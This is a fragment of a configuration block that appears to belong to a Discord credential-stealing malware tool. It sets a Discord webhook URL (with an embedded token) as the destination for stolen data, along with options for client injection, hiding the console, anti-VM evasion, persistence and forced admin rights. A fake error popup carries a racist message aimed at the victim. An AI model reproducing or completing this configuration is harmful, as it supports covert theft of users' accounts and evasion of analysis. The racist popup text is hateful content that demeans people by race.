...
config = {
    ...
    'webhook': 'https://discord.com/api/webhooks/1126897578231988275/M2WWTHTuKKFMivDnpFOMEqPjJVKP6hULgtf5QMheXEBt2pipGO2IX6fyVCx3J3npdZRx',
    'persist': False,
    'keep-alive': False,
    'injection_url': 'url to injection (https://media.pitchfork.com/photos/5c7d4c1b4101df3df85c41e5/1:1/w_800,h_800,c_limit/Dababy_BabyOnBaby.jpg)',
    'inject': False,
    'hideconsole': True,
    'antivm': True,
    'force_admin': False,
    'black_screen': False,
    'error': False,
    'error_message': 'No Problem Was Found.The Reason You Are Getting This Pop Up Is Because You Are Black. That's All.',
}
